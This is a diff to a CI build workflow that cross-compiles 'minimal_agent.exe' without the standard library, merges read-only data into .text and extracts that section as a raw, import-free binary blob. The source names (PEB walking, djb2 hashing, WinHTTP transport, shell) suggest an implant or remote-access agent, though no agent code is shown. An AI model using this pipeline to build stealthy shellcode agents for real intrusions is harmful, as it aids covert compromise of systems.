@@ -70,19 +70,30 @@ jobs:
           # read-only log/string data into .text so the extracted blob
           # contains every RIP-relative target it uses. llvm-mingw uses lld,
           # whose PE linker accepts /merge rather than GNU ld's -T.
-          ${{ matrix.triple }}-gcc -O2 -s -nostdlib -Iinclude -Wall -Wextra \
+            rm -rf obj
+            mkdir -p obj
+            ${{ matrix.triple }}-gcc -O2 -Iinclude -Wall -Wextra \
               -DLOGGING_ENABLED \
-              -fno-asynchronous-unwind-tables -fno-ident -fno-stack-protector -fno-jump-tables -fno-vectorize -fno-slp-vectorize \
-              -e entry \
+              -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-stack-protector -fno-jump-tables -fno-vectorize -fno-slp-vectorize \
               -DID_BUILD_NUMBER="$BUILD_NUMBER" \
               -DAGENT_COMMIT_HASH="\"$COMMIT_HASH\"" \
-              -Wl,/merge:.rdata=.text -Wl,/merge:.rodata=.text \
-              -o minimal_agent.exe \
+              -c \
               entry.c src/stack_probes.c src/main.c src/identity_headers.c \
               src/transport.c src/shell.c src/report.c src/system_facts.c \
               src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c \
               src/advapi.c src/string.c src/memory.c src/peb.c src/system.c \
               src/djb2.c src/logger.c
+            mv ./*.o obj/
+            objects=(obj/entry.o)
+            for object in obj/*.o; do
+            [ "$object" = "obj/entry.o" ] || objects+=("$object")
+            done
+            ${{ matrix.triple }}-gcc -O2 -s -nostdlib -Iinclude -Wall -Wextra \
+              -DLOGGING_ENABLED \
+              -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-stack-protector -fno-jump-tables -fno-vectorize -fno-slp-vectorize \
+              -e entry \
+              -Wl,/merge:.rdata=.text -Wl,/merge:.rodata=.text \
+              -o minimal_agent.exe "${objects[@]}"
           ${{ matrix.triple }}-objcopy --dump-section .text=minimal_agent.bin minimal_agent.exe
 
           imp=$(${{ matrix.triple }}-objdump -p minimal_agent.exe | grep -c 'DLL Name' || true)
